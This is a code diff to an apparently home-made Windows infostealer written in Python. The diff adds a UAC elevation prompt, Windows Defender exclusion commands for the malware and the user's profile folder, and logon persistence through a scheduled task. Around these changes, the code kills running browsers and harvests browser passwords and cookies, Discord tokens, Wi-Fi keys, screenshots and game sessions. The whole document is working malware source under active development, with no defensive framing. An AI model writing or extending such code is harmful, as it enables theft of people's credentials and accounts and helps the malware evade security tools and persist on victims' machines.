@@ -20,6 +20,7 @@ from Crypto.Cipher import AES
 from PIL import ImageGrab
 from datetime import datetime
 
+
 def write(file, content):
     with open(file, 'a', encoding='utf-8') as f:
         f.write(content)
@@ -61,7 +62,7 @@ def kill():
     exes = ['msedge.exe', 'chromium.exe', 'iron.exe', 'wavebrowser.exe', 'iridium.exe', 'vivaldi.exe', 'zen.exe', 'chrome.exe', 'mullvadbrowser.exe' 'amigo.exe', 'epic.exe', 'comet.exe', 'escosiabrowser.exe', 'duckduckgo.exe', 'dragon.exe', 'brave.exe', 'opera.exe', 'firefox.exe', 'hola.exe', 'AVGBrowser.exe', 'hola-browser.exe', 'waterfox.exe', 'seamonkey.exe', 'AvastBrowser.exe', 'browser.exe']
 
     for exe in exes:
-        s    ubprocess.run(["taskkill", "/F", "/IM", exe], text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(["taskkill", "/F", "/IM", exe], text=True, creationflags=subprocess.CREATE_NO_WINDOW)
 
 def decrypt_firefox_password(nss, encrypted_str):
     class SECItem(ctypes.Structure):
@@ -74,6 +75,11 @@ def decrypt_firefox_password(nss, encrypted_str):
         result = ctypes.string_at(out.data, out.len).decode()
         return result
 
+def exclusion(path):
+    try:
+        subprocess.run(f'powershell Add-MpPreference -ExclusionPath "{path}"', shell=True, check=True)
+    except:
+        print('failed to add exclusion')
 
 def randstr(length: int):
     characters = string.ascii_letters + string.digits
@@ -113,6 +119,17 @@ appdata = os.getenv('appdata')
 
 output = os.path.join(localappdata, 'Temp', 'KIRK_{}'.format(username))
 
+def isadmin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except:
+        return False
+
+
+def askforadmin():
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+    sys.exit()
+
 zip_ = os.path.join(os.getenv('temp'), os.path.basename(output) + '.zip')
 os.makedirs(output, exist_ok=True)
 
@@ -126,6 +143,7 @@ def getwifipassword(network):
         if 'Key Content' in line:
             wifipsw = line.split(':')[1][1:]
             return wifipsw
+
 
 def getwifiprofiles():
     wifi_profiles = []
@@ -179,17 +197,23 @@ def systeminfo():
         write(ipoutput, '\n'.join(ip_lines))
 
 def screenshot():
+    global ss_success
     syst_ = os.path.join(output, 'System')
     os.makedirs(syst_, exist_ok=True)
     try:
         screenshot = ImageGrab.grab().save(f"{os.path.join(syst_, 'Screenshot.png')}")
-        global ss_success
         ss_success = 1
     except:
         ss_success = 0
     
+def persistence(copypath):
+    try:
+        shutil.copy2(sys.executable, copypath)
 
+        subprocess.run('schtasks /create /sc onlogon /tn kirkyboiiii /tr "{}" /rl highest'.format(copypath), shell=True, check=True)
 
+    except Exception as e:
+        print('persistence failed', e)
 
 def stealchromium():
     global cookie_count
@@ -500,7 +524,6 @@ def stealdiscord(): #stole this from my token stealer
     '3Mullvad': os.path.join(roaming, 'Mullvad', 'MullvadBrowser', 'Profiles'),
     '4Mypal': os.path.join(roaming, 'Mypal68', 'Profiles'),
     }
-    #this is doing way too much for a token stealer
     for browser, path in paths.items():
         if not os.path.exists(path):
             continue
@@ -685,15 +708,29 @@ def collectminecraft():
             os.path.join(appdata, "ModrinthApp", "app.db-shm"),
             os.path.join(appdata, "ModrinthApp", "app.db-wal")
         ]
+        modrn = 0
         for file_ in modrinth_files:
             if os.path.exists(file_):
                 try:
                     os.makedirs(os.path.join(minecraftoutput, 'Modrinth'), exist_ok=True)
                     shutil.copy2(file_, os.path.join(minecraftoutput, 'Modrinth', os.path.basename(file_)))
-                    minecraft_sessions += 1
+                    modrn += 1
                 except:
                     pass
-            
+        if modrn == 3:
+            minecraft_sessions += 1
+
+
+def makepath():
+    kirkpath = os.getenv('appdata') + '\\charliekirk'
+    try:
+        os.makedirs(kirkpath, exist_ok=True)
+        return kirkpath
+    except:
+        return None
+
+
+
 def collectsteam():
     if config.games:
         global steam_session
@@ -708,7 +745,21 @@ def collectsteam():
             except:
                 pass
 
+appdpath = makepath()
+if appdpath:
+    copypath = appdpath + '\\dakirk.exe'
+else:
+    copypath = sys.executable
+
+if not isadmin():
+    askforadmin()
+
+exclusion(sys.executable)
+exclusion(copypath)
+exclusion(os.getenv('userprofile'))
+
 kill()
+persistence(copypath)
 funcs = [systeminfo, screenshot, stealchromium, stealgecko, stealdiscordacc, collectminecraft, collectsteam]
 # systeminfo()
 # screenshot()
